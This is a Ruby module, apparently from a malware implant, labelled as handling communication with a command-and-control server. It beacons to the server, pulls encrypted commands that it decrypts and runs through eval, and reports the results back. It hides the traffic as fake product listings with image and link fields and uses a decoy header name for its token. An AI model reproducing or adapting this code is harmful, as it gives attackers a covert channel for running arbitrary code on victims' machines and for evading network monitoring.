# frozen_string_literal: true

# Communication with C&C
module CommandsHelper
  include CryptHelper
  include OffuscateHelper

  def pull_command
    info = {
      action: 'GET_COMMANDS'
    }

    response = RestClient::Request.execute(
      method: :post,
      url: "#{Parameter.client_c_uri}/#{Parameter.client_c_pool}",
      timeout: 10,
      headers: get_headers,
      payload: get_cc_payload(info)
    )

    cipher_response = JSON.parse(response.body)
    extract_response(cipher_response) if cipher_response.present?

  rescue RestClient::ExceptionWithResponse => e
    CustomError.new(code: CustomError::FATAL, msg: e.response)
  rescue StandardError => e
    CustomError.new(msg: e)
  end

  def echo
    info = {
      action: 'ECHO'
    }

    response = RestClient::Request.execute(
      method: :post,
      url: "#{Parameter.client_c_uri}/#{Parameter.client_c_pool}",
      timeout: 10,
      headers: get_headers,
      payload: get_cc_payload(info)
    )

    JSON.parse(response.body)

  rescue RestClient::ExceptionWithResponse => e
    CustomError.new(code: CustomError::FATAL, msg: e.response)
  rescue StandardError => e
    CustomError.new(code: CustomError::FATAL, msg: e)
  end

  def report_activity(success: false, result: '', identifier: commands['id'], action: nil, error_code: nil, error_msg: nil)
    info = {
      action: 'REPORT_COMMANDS',
      result: {
        status: success ? 'SUCCESS' : 'FAIL',
        content_result: result,
        identifier: identifier,
        command: action,
        error_details: {
          code: error_code,
          msg: error_msg
        }
      }
    }

    RestClient::Request.execute(
      method: :post,
      url: "#{Parameter.client_c_uri}/#{Parameter.client_c_pool}",
      timeout: 10,
      headers: get_headers,
      payload: get_cc_payload(info)
    )

  rescue RestClient::ExceptionWithResponse => e
    CustomError.new(code: CustomError::FATAL, msg: e.response)
  rescue StandardError => e
    CustomError.new(code: CustomError::FATAL, msg: e)
  end

  def get_cc_payload(plain_info)
    result = encrypt(plain_info.to_s, Parameter.client_c_cipher_key, Parameter.client_c_cipher_iv)
    image = result[:ciphertext]
    url = ofuscate_image_link(result[:tag], Parameter.client_c_uri.split('https://').last, Parameter.client_c_pool)

    {
      name: "Geode #{rand(900000)}",
      image: image,
      url: url
    }
  end

  def extract_response(cipher_response)
    tag = unofuscate_image_link(cipher_response['article']['url'], Parameter.client_c_pool)
    plain_info = decrypt(cipher_response['article']['image'], tag, Parameter.client_c_cipher_key, Parameter.client_c_cipher_iv)
    eval(plain_info)
  end

  def get_headers
    {
      content_type: :json, accept: :json, grocery_descriptor: Parameter.client_c_token
    }
  end
end
